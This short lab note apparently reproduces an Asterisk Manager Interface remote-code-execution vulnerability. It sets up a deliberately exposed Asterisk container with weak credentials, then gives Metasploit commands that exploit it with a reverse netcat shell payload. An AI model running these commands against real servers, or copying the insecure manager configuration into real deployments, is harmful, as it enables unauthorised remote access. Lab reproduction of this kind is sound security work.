# CVE 2

## Victim

```
docker run -d \
  --name asterisk \
  -p 5060:5060/udp \
  -p 5060:5060/tcp \
  -p 8088:8088 \
  -p 5038:5038 \
  -p 16384-16394:16384-16394/udp \
  andrius/asterisk 
```

Then modify the config for AMI

```
docker exec -it 8f069 vi /etc/asterisk/manager.conf
```
Modify as
```
...
[general]
enabled = yes
webenabled = yes

port = 5038
bindaddr = 0.0.0.0
...
...
[testuser]
secret=testuser
write=originate
permit=0.0.0.0/255.255.255.0
```

Then reload
```
docker exec -it 8f069 rasterisk -x reload
```

## Attacker
```
use exploit/linux/misc/asterisk_ami_originate_auth_rce
set rhosts 10.130.0.121
set verbose true
set username testuser
set password testuser
set PARKINGLOT 700@parkedcalls
set payload payload/cmd/unix/reverse_netcat
```